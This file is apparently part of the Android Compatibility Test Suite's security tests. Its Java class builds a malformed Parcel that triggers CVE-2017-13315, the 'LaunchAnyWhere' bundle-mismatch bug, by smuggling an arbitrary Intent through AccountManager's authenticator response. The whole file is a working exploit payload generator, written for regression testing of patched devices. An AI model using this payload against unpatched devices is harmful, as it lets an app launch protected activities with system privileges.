/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.android.security.cts.launchanywhere;

import android.accounts.AccountManager;
import android.content.Intent;
import android.os.Parcel;

public class CVE_2017_13315 implements IGenerateMalformedParcel {
    public Parcel generate(Intent intent) {
        Parcel data = Parcel.obtain();
        data.writeInterfaceToken("android.accounts.IAccountAuthenticatorResponse");
        data.writeInt(1);
        int bundleLenPos = data.dataPosition();
        data.writeInt(0xffffffff);
        data.writeInt(0x4C444E42);
        int bundleStartPos = data.dataPosition();
        data.writeInt(3);

        data.writeString("launchanywhere");
        data.writeInt(4);
        data.writeString("com.android.internal.telephony.DcParamObject");
        data.writeInt(0);

        data.writeInt(0);
        data.writeInt(6);
        data.writeInt(13);
        int byteArrayLenPos = data.dataPosition();
        data.writeInt(0xffffffff);
        int byteArrayStartPos = data.dataPosition();
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeString(AccountManager.KEY_INTENT);
        data.writeInt(4);
        data.writeString("android.content.Intent");
        intent.writeToParcel(data, 0);
        int byteArrayEndPos = data.dataPosition();
        data.setDataPosition(byteArrayLenPos);
        int byteArrayLen = byteArrayEndPos - byteArrayStartPos;
        data.writeInt(byteArrayLen);
        data.setDataPosition(byteArrayEndPos);

        int bundleEndPos = data.dataPosition();
        data.setDataPosition(bundleLenPos);
        int bundleLen = bundleEndPos - bundleStartPos;
        data.writeInt(bundleLen);
        data.setDataPosition(bundleEndPos);

        return data;
    }
}